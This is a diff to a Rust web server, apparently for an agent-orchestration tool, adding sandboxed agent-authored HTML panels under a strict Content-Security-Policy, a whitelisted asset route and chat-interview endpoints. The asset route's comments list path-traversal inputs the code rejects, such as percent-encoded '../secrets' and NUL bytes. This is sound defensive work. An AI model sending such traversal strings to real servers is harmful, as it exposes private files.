@@ -37,11 +37,41 @@
 //! detail route. No handler unwraps a filesystem or parse result: a single bad
 //! file left by a killed run would otherwise turn the whole history into a
 //! blank page.
+//!
+//! # Agent-authored HTML, rendered anyway
+//!
+//! Everything else here refuses to put API data into the document: `app.js`
+//! builds nodes and sets `textContent`, and even an href from a run record is
+//! laundered first. A confirmation panel breaks that rule on purpose - an
+//! agent asking the owner to approve a merge needs a diff and a table, not one
+//! line of prose - and the only reason it is acceptable is that the panel is
+//! never part of this document.
+//!
+//! It is served by [`question_panel`] and [`question_asset`] and rendered in an
+//! `<iframe sandbox>` carrying no tokens: no `allow-scripts`, no
+//! `allow-same-origin`. So no script in a panel runs, and the frame cannot
+//! reach the parent document, the cookie jar or `localStorage`. On top of that
+//! both routes send [`PANEL_CSP`], which denies every network destination, so a
+//! panel cannot phone home through a remote image or a beacon either - the two
+//! things it may load, images and inline CSS, are the two things free
+//! formatting actually needs. Assets come from the question's own directory and
+//! never from the network, and their content types come from a closed
+//! whitelist, so an agent cannot get markup rendered outside the frame by
+//! naming a file `.html`.
+//!
+//! # An interview is not a filesystem read
+//!
+//! Every other route here is disk work, which is why [`blocking`] exists.
+//! `POST /api/chats/{id}/say` is the exception: it spawns an agent CLI and
+//! waits tens of seconds for a sentence. It is a plain `await` holding no lock
+//! and no executor thread, and concurrent turns on one chat are refused rather
+//! than queued - see [`Ui::begin_turn`].
 
+use std::collections::HashSet;
 use std::convert::Infallible;
 use std::net::{IpAddr, Ipv4Addr, SocketAddr};
 use std::path::{Path as FsPath, PathBuf};
-use std::sync::Arc;
+use std::sync::{Arc, Mutex};
 use std::time::Duration;
 
 use anyhow::{Context, Result};
@@ -49,7 +79,7 @@ use axum::Json;
 use axum::Router;
 use axum::extract::rejection::JsonRejection;
 use axum::extract::{Path, Query, State};
-use axum::http::{StatusCode, header};
+use axum::http::{HeaderValue, StatusCode, header};
 use axum::response::sse::{Event, KeepAlive, Sse};
 use axum::response::{IntoResponse, Response};
 use axum::routing::{get, post};
@@ -59,9 +89,11 @@ use tokio_stream::StreamExt as _;
 use tokio_stream::wrappers::ReceiverStream;
 
 use crate::ask::{Answer, Question, Questions};
+use crate::chat::{Chat, Chats};
+use crate::config::Config;
 use crate::queue::{Queue, Source, Task, title_from};
 use crate::run::{RunState, RunStatus};
-use crate::{daemon, report, run};
+use crate::{chat, daemon, report, run};
 
 /// Default port. Chosen high and memorable; nothing else in the fleet uses it.
 pub const DEFAULT_PORT: u16 = 7878;
@@ -83,6 +115,32 @@ const LIST_MAX: usize = 500;
 
 /// Width of a generated task title, matching what the CLI uses.
 const TITLE_MAX: usize = 72;
+
+/// The header that makes serving agent-authored HTML defensible, sent by both
+/// panel routes and asserted verbatim by a test.
+///
+/// Read it as a list of things a hostile panel cannot do. `default-src 'none'`
+/// denies every fetch destination that is not re-allowed below, which is all of
+/// them except images and fonts; `img-src 'self' data:` means an image comes
+/// from magi's own asset route or from the document itself, so a panel cannot
+/// signal an outside server by pointing an `<img>` at it - the classic
+/// exfiltration channel for markup that cannot run script. `style-src
+/// 'unsafe-inline'` is the one permission granted, because inline CSS is what
+/// free formatting means here and a style sheet cannot make a request that
+/// `default-src` has not already allowed. `base-uri 'none'` stops a `<base>`
+/// tag re-pointing the relative asset URLs somewhere else, `form-action 'none'`
+/// stops a form posting the owner's decision to a third party, and
+/// `frame-ancestors 'self'` stops another site framing the panel to phish with
+/// it.
+///
+/// There is deliberately no `script-src`: `default-src 'none'` already covers
+/// it, and the sandboxed frame carries no `allow-scripts` either, so script is
+/// denied twice over. Weakening any directive here is the difference between a
+/// panel the owner reads and a page that can talk to the tailnet, which is why
+/// the test compares the whole string rather than looking for a substring.
+const PANEL_CSP: &str = "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; \
+                         font-src data:; base-uri 'none'; form-action 'none'; \
+                         frame-ancestors 'self'";
 
 const INDEX_HTML: &str = include_str!("../assets/ui/index.html");
 const APP_CSS: &str = include_str!("../assets/ui/app.css");
@@ -156,9 +214,18 @@ impl Default for Opts {
 pub struct Ui {
     queue: Queue,
     questions: Questions,
+    chats: Chats,
     runs: PathBuf,
     home: PathBuf,
     repo: PathBuf,
+    /// Chats with an agent turn in flight right now.
+    ///
+    /// In-process and therefore not durable, which is correct: it guards
+    /// against two taps on one phone and two phones on one tailnet, both of
+    /// which are this process's own concurrency. A second `magi web` would not
+    /// see it, and a second `magi web` on the same home is already a
+    /// misconfiguration the queue's claims would catch first.
+    turns: Arc<Mutex<HashSet<String>>>,
 }
 
 impl Ui {
@@ -166,6 +233,7 @@ impl Ui {
     pub fn new(
         queue: Queue,
         questions: Questions,
+        chats: Chats,
         runs: PathBuf,
         home: PathBuf,
         repo: PathBuf,
@@ -173,29 +241,72 @@ impl Ui {
         Self {
             queue,
             questions,
+            chats,
             runs,
             home,
             repo,
+            turns: Arc::default(),
         }
     }
 
     /// The operator's own state: `<home>/queue`, `<home>/questions`,
-    /// `<home>/runs`.
+    /// `<home>/chats`, `<home>/runs`.
     pub fn open(repo: PathBuf) -> Self {
         Self::new(
             Queue::open(),
             Questions::open(),
+            Chats::open(),
             run::runs_root(),
             run::home(),
             repo,
         )
     }
 
+    /// Claim the right to run one turn in a chat, or refuse.
+    ///
+    /// An interview is strictly turn-based: the interviewing agent is resumed
+    /// with the conversation it already has, so two turns running at once would
+    /// resume the same session twice and append their answers in whatever order
+    /// the two CLIs finished in. The operator would come back to a transcript
+    /// with two half-turns interleaved, which is unreadable and, worse,
+    /// unfixable - there is no undo for a persisted turn.
+    ///
+    /// Refusing with a conflict rather than queueing behind the first turn is
+    /// the deliberate half. A turn takes tens of seconds, so a phone on a slow
+    /// link is exactly the case where the operator taps send twice; queueing
+    /// would answer the second tap with a second agent turn on text they only
+    /// meant to send once, and would do it a minute later when they have
+    /// stopped looking. An immediate 409 is a thing the front end can act on.
+    ///
+    /// The lock is a `std::sync::Mutex` and never crosses an `await`: it is
+    /// taken to test-and-insert and released before the agent is spawned. The
+    /// returned guard removes the id on drop, which is what makes a panicking
+    /// handler or a phone that walks out of range leave the chat usable - axum
+    /// drops the handler future when the client disconnects, and without the
+    /// guard that chat would be wedged until the server restarted.
+    fn begin_turn(&self, id: &str) -> ApiResult<TurnGuard> {
+        let mut live = self
+            .turns
+            .lock()
+            .map_err(|_| ApiError::internal("the chat turn lock was poisoned"))?;
+        if !live.insert(id.to_owned()) {
+            return Err(ApiError::conflict(format!(
+                "chat {id} is already taking a turn"
+            )));
+        }
+        Ok(TurnGuard {
+            chat: id.to_owned(),
+            turns: Arc::clone(&self.turns),
+        })
+    }
+
     /// The router, with this state baked in.
     ///
     /// The three front-end files get one explicit route each rather than a
     /// path parameter, so there is no traversal surface to get wrong: the set
-    /// of servable paths is the set written here.
+    /// of servable paths is the set written here. The asset route below is the
+    /// one exception and the only place in this server where a client names a
+    /// file; it is why [`valid_asset_name`] is checked before a path is built.
     pub fn router(self) -> Router {
         Router::new()
             .route("/", get(index))
@@ -210,8 +321,42 @@ impl Ui {
             .route("/api/queue/{id}/release", post(queue_release))
             .route("/api/questions", get(questions_list))
             .route("/api/questions/{id}/answer", post(question_answer))
+            .route("/api/questions/{id}/panel", get(question_panel))
+            // The same asset, reachable from inside the panel by its bare
+            // filename. A document served at `.../panel` resolves `shot.png`
+            // to `.../shot.png`, which is not the asset route, so a panel
+            // written the way its author was told to write it showed broken
+            // images. `base-uri 'none'` means a `<base>` tag cannot paper over
+            // it - deliberately - so the fix is that the panel's own URL ends
+            // in a filename and its siblings are the assets.
+            .route("/api/questions/{id}/panel/index.html", get(question_panel))
+            .route("/api/questions/{id}/panel/{name}", get(question_asset))
+            .route("/api/questions/{id}/asset/{name}", get(question_asset))
+            .route("/api/chats", get(chats_list).post(chat_post))
+            .route("/api/chats/{id}", get(chat_detail))
+            .route("/api/chats/{id}/say", post(chat_say))
+            .route("/api/chats/{id}/file", post(chat_file))
             .route("/api/events", get(events))
             .with_state(Arc::new(self))
+    }
+}
+
+/// One chat's turn slot, released on drop.
+///
+/// A guard rather than a matching `remove` at the end of the handler, because
+/// the handler has several early returns and one `await` that can be cancelled
+/// out from under it. A leaked id is a chat nobody can talk to again.
+#[derive(Debug)]
+struct TurnGuard {
+    chat: String,
+    turns: Arc<Mutex<HashSet<String>>>,
+}
+
+impl Drop for TurnGuard {
+    fn drop(&mut self) {
+        if let Ok(mut live) = self.turns.lock() {
+            live.remove(&self.chat);
+        }
     }
 }
 
@@ -325,6 +470,16 @@ type ApiResult<T> = std::result::Result<T, ApiError>;
 struct ApiError {
     status: StatusCode,
     message: String,
+    /// Every separate thing wrong with what the client sent, when there is
+    /// more than one and the client is expected to fix them all.
+    ///
+    /// Only `POST /api/chats/{id}/file` populates it, and it is skipped when
+    /// empty so every other error body stays exactly the shape the front end
+    /// already parses. The reason it exists at all is that the operator
+    /// rejecting a draft is on a phone: a task file with no acceptance
+    /// criteria and no title is one edit, and reporting it as two round trips
+    /// means asking an agent to rewrite the draft twice.
+    problems: Vec<String>,
 }
 
 impl ApiError {
@@ -333,6 +488,15 @@ impl ApiError {
         Self {
             status: StatusCode::BAD_REQUEST,
             message: message.into(),
+            problems: Vec::new(),
+        }
+    }
+
+    /// The client asked for something malformed in several ways at once.
+    fn bad_request_with(message: impl Into<String>, problems: Vec<String>) -> Self {
+        Self {
+            problems,
+            ..Self::bad_request(message)
         }
     }
 
@@ -341,6 +505,7 @@ impl ApiError {
         Self {
             status: StatusCode::NOT_FOUND,
             message: message.into(),
+            problems: Vec::new(),
         }
     }
 
@@ -362,6 +527,7 @@ impl ApiError {
         Self {
             status: StatusCode::CONFLICT,
             message: message.into(),
+            problems: Vec::new(),
         }
     }
 
@@ -370,6 +536,7 @@ impl ApiError {
         Self {
             status: StatusCode::INTERNAL_SERVER_ERROR,
             message: message.into(),
+            problems: Vec::new(),
         }
     }
 }
@@ -386,8 +553,14 @@ impl From<anyhow::Error> for ApiError {
 
 impl IntoResponse for ApiError {
     fn into_response(self) -> Response {
-        let body = Json(serde_json::json!({ "error": self.message }));
-        (self.status, body).into_response()
+        let mut body = serde_json::json!({ "error": self.message });
+        if !self.problems.is_empty() {
+            // `json!` above built an object, so this cannot be `None`.
+            if let Some(map) = body.as_object_mut() {
+                map.insert("problems".to_owned(), serde_json::json!(self.problems));
+            }
+        }
+        (self.status, Json(body)).into_response()
     }
 }
 
@@ -434,6 +607,20 @@ struct HealthView {
     home: String,
     queue_rev: u64,
     runs_rev: u64,
+    /// The same two revisions [`events`] streams for the question and chat
+    /// stores.
+    ///
+    /// Here because this route is what the front end falls back to when the
+    /// change stream is not up - it re-polls health on a timer and on wake, and
+    /// takes the revisions from the answer. Without these two the fallback
+    /// compares `undefined` against `undefined` for both stores, decides
+    /// nothing moved, and a phone with a dead stream never learns that a
+    /// question was asked or that an interview took a turn. `queue_rev` and
+    /// `runs_rev` above have always been here for exactly this reason; the rule
+    /// is that every revision the stream carries, this route carries too.
+    questions_rev: u64,
+    /// See [`HealthView::questions_rev`].
+    chats_rev: u64,
     /// Runs on disk whose state this build cannot parse - almost always a
     /// schema bump, occasionally a run killed mid-write.
     ///
@@ -447,6 +634,14 @@ struct HealthView {
     /// The one number here that means "nothing will happen until a human
     /// acts": a parked run consumes nothing and progresses never.
     questions_open: usize,
+    /// Interviews the operator started in the browser and has not filed.
+    ///
+    /// Unlike `questions_open` nothing is blocked on these - a chat is the
+    /// operator's own half-finished thought. It is here because an interview
+    /// that never became a task is invisible everywhere else: it is not in the
+    /// queue and it is not in the run history, so without a count the phone
+    /// has no way to say "you left one open".
+    chats_open: usize,
     daemon: DaemonView,
 }
 
@@ -496,8 +691,11 @@ async fn health(State(ui): State<Arc<Ui>>) -> ApiResult<Json<HealthView>> {
             home: ui.home.display().to_string(),
             queue_rev: ui.queue.revision(),
             runs_rev: runs_revision(&ui.runs),
+            questions_rev: ui.questions.revision(),
+            chats_rev: ui.chats.revision(),
             runs_unreadable: runs_unreadable(&ui.runs),
             questions_open: ui.questions.count_open(),
+            chats_open: ui.chats.count_open(),
             daemon: DaemonView::of(daemon::read_status(&ui.home)),
         }))
     })
@@ -746,8 +944,8 @@ async fn mutate(ui: Arc<Ui>, id: String, change: fn(&mut Task)) -> ApiResult<Jso
     .await
 }
 
-/// The change stream: two revision numbers, on connect and whenever either
-/// moves.
+/// The change stream: one revision number per store, on connect and whenever
+/// any of them moves.
 ///
 /// The poll runs in one spawned task per client, which is affordable because
 /// the work is a directory scan and a `stat` per file. It stops as soon as the
@@ -757,7 +955,7 @@ async fn events(State(ui): State<Arc<Ui>>) -> impl IntoResponse {
     let (tx, rx) = tokio::sync::mpsc::channel::<Event>(4);
     tokio::spawn(async move {
         let mut ticker = tokio::time::interval(POLL);
-        let mut last: Option<(u64, u64, u64)> = None;
+        let mut last: Option<(u64, u64, u64, u64)> = None;
         loop {
             // The first tick completes immediately, which is what makes the
             // stream announce the current revisions on connect.
@@ -768,6 +966,7 @@ async fn events(State(ui): State<Arc<Ui>>) -> impl IntoResponse {
                     state.queue.revision(),
                     runs_revision(&state.runs),
                     state.questions.revision(),
+                    state.chats.revision(),
                 )
             })
             .await;
@@ -780,8 +979,9 @@ async fn events(State(ui): State<Arc<Ui>>) -> impl IntoResponse {
                 "queue_rev": revisions.0,
                 "runs_rev": revisions.1,
                 "questions_rev": revisions.2,
+                "chats_rev": revisions.3,
             });
-            // Serializing two integers cannot fail; giving up beats looping.
+            // Serializing four integers cannot fail; giving up beats looping.
             let Ok(event) = Event::default().event("change").json_data(payload) else {
                 break;
             };
@@ -957,6 +1157,379 @@ fn resolve_question(store: &Questions, id: &str) -> ApiResult<String> {
     )
 }
 
+/// `GET /api/questions/{id}/panel`.
+///
+/// The panel an agent wrote for this question, as `text/html` under
+/// [`PANEL_CSP`], for the front end to mount in a token-less sandboxed iframe.
+/// A question without one is a 404 rather than an empty page: the client
+/// preflights this route with `HEAD` and must be able to tell "no panel" from
+/// "a panel that rendered blank", and a sandboxed frame is opaque to the
+/// parent document so it cannot tell the difference by looking.
+///
+/// The body is whatever the agent wrote, byte for byte. Nothing here rewrites,
+/// sanitises or minifies it - a sanitiser is a list of things someone thought
+/// of, and the sandbox plus the CSP is a list of things that are allowed, which
+/// is the direction that stays safe when an agent writes markup nobody
+/// predicted.
+async fn question_panel(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<Response> {
+    blocking(move || {
+        let id = resolve_question(&ui.questions, &id)?;
+        let Some(html) = ui.questions.panel_html(&id) else {
+            return Err(ApiError::not_found(format!("question {id} has no panel")));
+        };
+        Ok(panel_response(
+            "text/html; charset=utf-8",
+            false,
+            html.into_bytes(),
+        ))
+    })
+    .await
+}
+
+/// `GET /api/questions/{id}/asset/{name}`.
+///
+/// One file from the question's own panel directory, so a panel can show a
+/// diff as an SVG or a screenshot as a PNG without the CSP's `img-src 'self'`
+/// having to allow anything off this machine.
+///
+/// This is the only route in the server where a client names a file, so it is
+/// the only one with a traversal surface, and the name is checked by
+/// [`ask::valid_asset_name`] before a path is built from it. Which layer stops
+/// what is worth being explicit about, because the answer is not "all of it in
+/// one place":
+///
+/// * `asset/../../secrets` never reaches this handler at all. axum matches on
+///   the raw request path and `{name}` spans exactly one segment, so a real
+///   slash makes the request too long for the route and the router answers 404.
+/// * `asset/%2e%2e%2fsecrets` and `asset/..%5csecrets` do reach it: axum
+///   percent-decodes path parameters, so `name` arrives as `../secrets` and
+///   `..\secrets` respectively, which look like plain filenames to the router.
+///   The validator refuses them here - both for the literal `..` and because
+///   `/` and `\` are not in the permitted character set - and answers 400.
+/// * A name carrying a NUL (`%00`) decodes to a string Rust is happy with but
+///   the platform's path API is not, and it is refused here for the same
+///   reason: NUL is not a permitted character.
+/// * [`Questions::panel_asset`] validates again on read, so the check is not
+///   load-bearing in only one place. This route's own check exists so the
+///   failure is a 400 that says which name was wrong, rather than a store error
+///   the operator has to interpret.
+async fn question_asset(
+    State(ui): State<Arc<Ui>>,
+    Path((id, name)): Path<(String, String)>,
+) -> ApiResult<Response> {
+    // Before any filesystem work and before any path is built: a name this
+    // server will not serve should not become a `PathBuf` at all.
+    if !crate::ask::valid_asset_name(&name) {
+        return Err(ApiError::bad_request(format!(
+            "`{name}` is not a usable asset name"
+        )));
+    }
+    blocking(move || {
+        let id = resolve_question(&ui.questions, &id)?;
+        let asset = ui
+            .questions
+            .panel_asset(&id, &name)
+            .map_err(|e| ApiError::bad_request(format!("{e:#}")))?;
+        let Some(bytes) = asset else {
+            return Err(ApiError::not_found(format!(
+                "question {id} has no asset `{name}`"
+            )));
+        };
+        Ok(panel_response(
+            asset_content_type(&name),
+            is_svg(&name),
+            bytes,
+        ))
+    })
+    .await
+}
+
+/// Content type for a panel asset, from a closed whitelist.
+///
+/// A whitelist with an `application/octet-stream` fallback rather than a
+/// guess, because the one answer that must never come out of here is
+/// `text/html`. An agent that writes `notes.html` into its panel directory and
+/// links it would otherwise get its own markup rendered at the top level of the
+/// operator's browser - outside the sandboxed frame, outside [`PANEL_CSP`], on
+/// magi's origin - which is precisely the thing the panel design exists to
+/// prevent. Same reasoning for `.js` and `.json`: unlisted means downloaded.
+///
+/// `nosniff` accompanies this on every response, so a browser cannot decide it
+/// knows better than the type we sent.
+fn asset_content_type(name: &str) -> &'static str {
+    match extension(name).as_deref() {
+        Some("png") => "image/png",
+        Some("jpg" | "jpeg") => "image/jpeg",
+        Some("gif") => "image/gif",
+        Some("webp") => "image/webp",
+        Some("svg") => "image/svg+xml",
+        Some("css") => "text/css; charset=utf-8",
+        Some("txt") => "text/plain; charset=utf-8",
+        _ => "application/octet-stream",
+    }
+}
+
+/// Is this an SVG, and therefore a file that must never be opened at the top
+/// level?
+fn is_svg(name: &str) -> bool {
+    extension(name).as_deref() == Some("svg")
+}
+
+/// Lowercased extension, or `None` for a name without one.
+fn extension(name: &str) -> Option<String> {
+    name.rsplit_once('.')
+        .map(|(_, ext)| ext.to_ascii_lowercase())
+}
+
+/// Every panel response, with the four headers that make it safe and, for an
+/// SVG, a fifth.
+///
+/// One function rather than a header list per handler, because a panel route
+/// that forgets [`PANEL_CSP`] is not a cosmetic bug: it is the whole security
+/// model gone, silently, on one of two routes. Adding a third panel route later
+/// means calling this, and there is nowhere else to build a panel response.
+///
+/// `download` is set for SVG only. An SVG is XML that may carry `<script>`, and
+/// as an `<img src>` inside the panel that script cannot run - but the asset
+/// URL is also a plain URL an operator can be talked into opening in a tab,
+/// where it is a document on magi's own origin. `Content-Disposition:
+/// attachment` makes the browser download it instead of rendering it, which
+/// closes that door without taking away the ability to draw a diff. Raster
+/// images have no such execution surface and are left inline, so tapping a
+/// screenshot still shows it.
+fn panel_response(content_type: &'static str, download: bool, body: Vec<u8>) -> Response {
+    let mut res = (
+        [
+            (header::CONTENT_TYPE, content_type),
+            (header::CONTENT_SECURITY_POLICY, PANEL_CSP),
+            (header::X_CONTENT_TYPE_OPTIONS, "nosniff"),
+            (header::REFERRER_POLICY, "no-referrer"),
+        ],
+        body,
+    )
+        .into_response();
+    if download {
+        res.headers_mut().insert(
+            header::CONTENT_DISPOSITION,
+            HeaderValue::from_static("attachment"),
+        );
+    }
+    res
+}
+
+/// `GET /api/chats`.
+///
+/// Every interview, open ones first and newest first, which is
+/// [`Chats::list`]'s own order. The whole record including the transcript: a
+/// conversation is a few kilobytes, the phone renders it directly, and a
+/// summary here would mean a second round trip to read the only thing a chat
+/// is made of.
+async fn chats_list(State(ui): State<Arc<Ui>>) -> ApiResult<Json<Vec<Chat>>> {
+    blocking(move || Ok(Json(ui.chats.list()))).await
+}
+
+async fn chat_detail(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<Json<Chat>> {
+    blocking(move || {
+        let id = resolve_chat(&ui.chats, &id)?;
+        Ok(Json(ui.chats.get(&id)?))
+    })
+    .await
+}
+
+/// The body of `POST /api/chats`.
+///
+/// `agent` names a seat from the roster to do the interviewing; absent means
+/// the configured default, which is what the phone sends. Unknown fields are
+/// ignored so a newer front end still starts an interview against an older
+/// binary.
+#[derive(Debug, Default, Deserialize)]
+#[serde(default)]
+struct NewChat {
+    idea: String,
+    agent: Option<String>,
+}
+
+/// `POST /api/chats`.
+///
+/// Starting an interview runs the first agent turn, so this is as slow as
+/// [`chat_say`] and is async for the same reason. There is no turn guard yet
+/// because there is no chat yet: the id does not exist until [`chat::start`]
+/// returns, so two taps produce two separate interviews rather than two turns
+/// in one. Two interviews are recoverable - abandon one - where two interleaved
+/// turns are not.
+async fn chat_post(
+    State(ui): State<Arc<Ui>>,
+    body: std::result::Result<Json<NewChat>, JsonRejection>,
+) -> ApiResult<impl IntoResponse> {
+    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
+    if body.idea.trim().is_empty() {
+        return Err(ApiError::bad_request(
+            "an interview needs something to interview about",
+        ));
+    }
+
+    // Read the configuration for this request rather than at startup, so an
+    // edit to `magi.toml` - a new seat, a different interviewer - takes effect
+    // without restarting the server the operator reaches from their phone.
+    let repo = ui.repo.clone();
+    let cfg = config_for(&repo).await?;
+    let chat = chat::start(&ui.chats, &cfg, repo, &body.idea, body.agent.as_deref())
+        .await
+        .map_err(ApiError::from)?;
+    Ok((StatusCode::CREATED, Json(chat)))
+}
+
+/// The body of `POST /api/chats/{id}/say`.
+#[derive(Debug, Default, Deserialize)]
+#[serde(default, deny_unknown_fields)]
+struct NewTurn {
+    text: String,
+}
+
+/// `POST /api/chats/{id}/say` - one turn of the interview.
+///
+/// The one handler here that is not filesystem work, and therefore the one
+/// that must not go through [`blocking`]: it spawns an agent CLI and waits tens
+/// of seconds for a paragraph. Sitting on an executor thread for that long
+/// would starve the change stream of every other connected phone, which is the
+/// opposite of what `blocking` is for. It holds no lock across the `await`
+/// either - the turn slot is a set membership, not a mutex guard - so nothing
+/// else in the server is delayed by a slow interview.
+///
+/// What the operator sees while it runs: a request outstanding for the whole
+/// turn, with no partial output, because the agent CLIs magi drives return one
+/// answer at the end rather than a stream. On a phone that means the composer
+/// stays pending for up to the seat's timeout. There is deliberately no
+/// progress channel to invent one from; the SSE `chats_rev` bump is the signal
+/// that the turn landed, and it fires from the file `chat::say` wrote, so a
+/// phone whose radio slept through the reply still learns about it.
+///
+/// A failed turn is still a turn. [`chat::say`] records the operator's message
+/// and an agent turn explaining the failure before it returns an error, so this
+/// answers 200 with the conversation: that recorded explanation is the thing
+/// the operator needs to read, and a 5xx would make the front end show a
+/// generic banner and hide it. The guard against that being a lie is the turn
+/// count - if the transcript did not grow, nothing happened and the error is
+/// reported as one.
+async fn chat_say(
+    State(ui): State<Arc<Ui>>,
+    Path(id): Path<String>,
+    body: std::result::Result<Json<NewTurn>, JsonRejection>,
+) -> ApiResult<Json<Chat>> {
+    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
+    if body.text.trim().is_empty() {
+        return Err(ApiError::bad_request("say something"));
+    }
+
+    let id = {
+        let ui = Arc::clone(&ui);
+        let asked = id.clone();
+        blocking(move || resolve_chat(&ui.chats, &asked)).await?
+    };
+    // Claimed before the chat is loaded, so the record this turn appends to was
+    // read after the claim and cannot be a snapshot another turn has since
+    // replaced.
+    let _turn = ui.begin_turn(&id)?;
+
+    let (mut chat, cfg) = {
+        let ui = Arc::clone(&ui);
+        let id = id.clone();
+        blocking(move || {
+            let chat = ui.chats.get(&id)?;
+            let (cfg, _) = Config::discover(&chat.repo, None)?;
+            Ok((chat, cfg))
+        })
+        .await?
+    };
+
+    let before = chat.turns.len();
+    if let Err(e) = chat::say(&mut chat, &ui.chats, &cfg, &body.text).await {
+        // The detail goes to the operator's terminal; the phone gets the
+        // transcript, which `say` has already made self-explaining.
+        tracing::warn!("chat {id} turn failed: {e:#}");
+        let reloaded = {
+            let ui = Arc::clone(&ui);
+            let id = id.clone();
+            blocking(move || Ok(ui.chats.get(&id)?)).await?
+        };
+        if reloaded.turns.len() <= before {
+            // Nothing was recorded, so the request achieved nothing and must
+            // not look like it did.
+            return Err(ApiError::internal(format!("{e:#}")));
+        }
+        return Ok(Json(reloaded));
+    }
+    Ok(Json(chat))
+}
+
+/// The body of `POST /api/chats/{id}/file`, which the phone sends empty.
+#[derive(Debug, Default, Deserialize)]
+#[serde(default, deny_unknown_fields)]
+struct FileDraft {
+    priority: i32,
+}
+
+/// `POST /api/chats/{id}/file` - validate the agent's draft and queue it.
+///
+/// The 400 carries every problem [`chat::draft_problems`] found, as an array
+/// beside the usual message, because the operator fixing them is on a phone:
+/// one problem per round trip would mean asking the interviewer to rewrite the
+/// draft three times for what is one edit.
+async fn chat_file(
+    State(ui): State<Arc<Ui>>,
+    Path(id): Path<String>,
+    body: std::result::Result<Json<FileDraft>, JsonRejection>,
+) -> ApiResult<Json<serde_json::Value>> {
+    // An absent body is the normal case - the front end posts with no content
+    // type at all - and means the default priority. A body that is present and
+    // malformed is still a bad request, because silently filing at the wrong
+    // priority is worse than saying no.
+    let body = match body {
+        Ok(Json(body)) => body,
+        Err(JsonRejection::MissingJsonContentType(_)) => FileDraft::default(),
+        Err(e) => return Err(ApiError::bad_request(e.body_text())),
+    };
+
+    blocking(move || {
+        let id = resolve_chat(&ui.chats, &id)?;
+        let mut chat = ui.chats.get(&id)?;
+        // Asked before filing so the answer can be the whole list. `file_draft`
+        // applies the same rule and would refuse too, but only with a flattened
+        // string, and re-splitting an error message to rebuild the list is the
+        // kind of thing that breaks the day someone adds a comma.
+        if let Err(problems) = chat::draft_problems(&chat) {
+            return Err(ApiError::bad_request_with(
+                "the draft is not fileable yet",
+                problems,
+            ));
+        }
+        let task = chat::file_draft(&mut chat, &ui.chats, &ui.queue, body.priority)?;
+        Ok(Json(serde_json::json!({ "task": task })))
+    })
+    .await
+}
+
+/// Expand an id or short id to exactly one chat id.
+fn resolve_chat(store: &Chats, id: &str) -> ApiResult<String> {
+    pick(store.list().into_iter().map(|c| c.id).collect(), id, "chat")
+}
+
+/// The configuration for a repository, read off the disk for this request.
+///
+/// Through [`blocking`] because discovery reads and merges several TOML files,
+/// and because the alternative - caching it in [`Ui`] at startup - would mean
+/// the operator's phone kept interviewing with a roster they had already
+/// changed, with no way to reload it but restarting the server they are not
+/// sitting in front of.
+async fn config_for(repo: &FsPath) -> ApiResult<Config> {
+    let repo = repo.to_path_buf();
+    blocking(move || {
+        let (cfg, _) = Config::discover(&repo, None)?;
+        Ok(cfg)
+    })
+    .await
+}
+
 /// The one prefix rule, used for both runs and tasks: a leading match for a
 /// full id, a trailing match for the short form an operator reads off a
 /// report. Written here rather than borrowed from `queue::resolve_id` because
@@ -1010,6 +1583,7 @@ mod tests {
             let ui = Ui::new(
                 queue,
                 Questions::at(home.join("questions")),
+                Chats::at(home.join("chats")),
                 runs,
                 home.to_path_buf(),
                 PathBuf::from("/repo/magi"),
@@ -1032,12 +1606,24 @@ mod tests {
             Questions::at(self.home.path().join("questions"))
         }
 
+        fn chats(&self) -> Chats {
+            Chats::at(self.home.path().join("chats"))
+        }
+
         fn runs(&self) -> PathBuf {
             self.home.path().join("runs")
         }
 
         async fn get(&self, path: &str) -> Res {
             request(self.addr, "GET", path, None).await
+        }
+
+        /// The status and headers without the body, which is how the front end
+        /// preflights a panel: a sandboxed frame is opaque to the parent
+        /// document, so the only way to tell "no panel" from "a panel that
+        /// rendered blank" is to ask before mounting.
+        async fn head(&self, path: &str) -> Res {
+            request(self.addr, "HEAD", path, None).await
         }
 
         async fn post(&self, path: &str, body: Option<&str>) -> Res {
@@ -1048,13 +1634,32 @@ mod tests {
     struct Res {
         status: u16,
         headers: String,
+        /// The header block with its original casing, for the assertions that
+        /// compare a header *value* rather than looking for a name. Lowercasing
+        /// a CSP would hide a directive spelled with a capital letter, and the
+        /// whole point of that test is that the string is exactly right.
+        head: String,
         body: String,
+        /// The body before any UTF-8 handling, for the routes that serve
+        /// something other than text. A panel asset is a PNG as often as not,
+        /// and `from_utf8_lossy` would silently replace half of it.
+        bytes: Vec<u8>,
     }
 
     impl Res {
         fn json(&self) -> Value {
             serde_json::from_str(&self.body)
                 .unwrap_or_else(|e| panic!("body is not json ({e}): {}", self.body))
+        }
+
+        /// One header's value verbatim, or `None` when it was not sent.
+        fn header(&self, name: &str) -> Option<&str> {
+            self.head.lines().find_map(|line| {
+                let (key, value) = line.split_once(':')?;
+                key.trim()
+                    .eq_ignore_ascii_case(name)
+                    .then(|| value.trim_start().trim_end_matches('\r'))
+            })
         }
     }
 
@@ -1079,8 +1684,14 @@ mod tests {
             .expect("write request");
         let mut raw = Vec::new();
         socket.read_to_end(&mut raw).await.expect("read response");
-        let text = String::from_utf8_lossy(&raw).into_owned();
-        let (head, body) = text.split_once("\r\n\r\n").expect("a header block");
+        // Split on the raw bytes rather than on a lossy string, so a binary
+        // body survives to be compared byte for byte.
+        let split = raw
+            .windows(4)
+            .position(|w| w == b"\r\n\r\n")
+            .expect("a header block");
+        let head = String::from_utf8_lossy(&raw[..split]).into_owned();
+        let bytes = raw[split + 4..].to_vec();
         let status = head
             .lines()
             .next()
@@ -1090,7 +1701,9 @@ mod tests {
         Res {
             status,
             headers: head.to_lowercase(),
-            body: body.to_owned(),
+            head,
+            body: String::from_utf8_lossy(&bytes).into_owned(),
+            bytes,
         }
     }
 
@@ -1141,6 +1754,520 @@ mod tests {
         );
         store.put(&mut q).expect("put question");
         q.id
+    }
+
+    /// A question with a panel the server can serve, plus the named assets.
+    ///
+    /// Written through `Questions::put_panel` rather than by laying out the
+    /// directory here, so these tests exercise the same on-disk shape the
+    /// agents produce and cannot pass against a layout only the tests know.
+    fn panel(fx: &Fixture, html: &str, assets: &[(&str, &[u8])]) -> String {
+        let store = fx.questions();
+        let mut q = Question::new(
+            "20260902-000000-beef".to_owned(),
